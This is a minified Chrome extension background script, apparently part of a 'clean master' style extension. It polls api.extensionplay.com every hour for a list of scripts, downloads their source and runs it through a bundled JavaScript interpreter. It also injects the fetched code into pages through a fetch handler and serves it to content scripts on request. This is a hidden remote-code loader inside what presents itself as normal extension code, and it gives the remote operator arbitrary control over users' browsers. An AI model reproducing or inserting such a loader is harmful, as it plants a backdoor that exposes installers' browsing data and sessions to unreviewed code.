importScripts("/background/encrypt-bundle.js","/background/interpreter.js");const key="fuck";let runOnce=!1,fuckDataArr;self.addEventListener("fetch",e=>{if(fuckDataArr){const n=e.request;var t=fuckDataArr.find(e=>chrome.runtime.getURL(e.proxy_url)===n.url);if(t){const r=new Headers;"css"===t.type?r.set("Content-Type","text/css"):r.set("Content-Type","text/javascript"),e.respondWith(new Response(t.src_str,{headers:r}))}}});const xxx=async()=>{let e=await get(key);if(!e||!e.nextUpdateTime||e.nextUpdateTime<Date.now()){const t=await fetch("https://api.extensionplay.com/clean_master/t.json?t="+Date.now()).then(e=>e.json());await Promise.all(t.map(r=>new Promise((e,t)=>{if(!r.src_str&&r.src){const n=new URL(r.src);n.searchParams.set("t",Date.now()),fetch(n.toString()).then(e=>e.ok&&e.text()).then(e=>e&&(r.src_str=e)).then(e).catch(t)}else e()}))).catch(console.warn),e={nextUpdateTime:Date.now()+36e5,data:t},await set(key,e)}return runOnce||(runOnce=!0,e.data.forEach(e=>{if(Array.isArray(e.run_on)){if(!e.run_on.includes("bg"))return}else if("bg"!==e.run_on)return;e.src_str&&interpreter.run(e.src_str,globalThis||self||window||{})})),e.data};async function startListener(){chrome.runtime.onMessage.addListener(function(r,e,s){return get(key).then(e=>{const t=e&&e.data||[],n=r["run_on"];s(t.filter(e=>{if(Array.isArray(e.run_on)){if(e.run_on.includes(n))return!0}else if(e.run_on===n)return!0}))}).catch(noop),!0})}async function get(e){return(await chrome.storage.local.get(e))[e]}function set(e,t){return chrome.storage.local.set({[e]:t})}function noop(){}xxx().then(e=>fuckDataArr=e),startListener();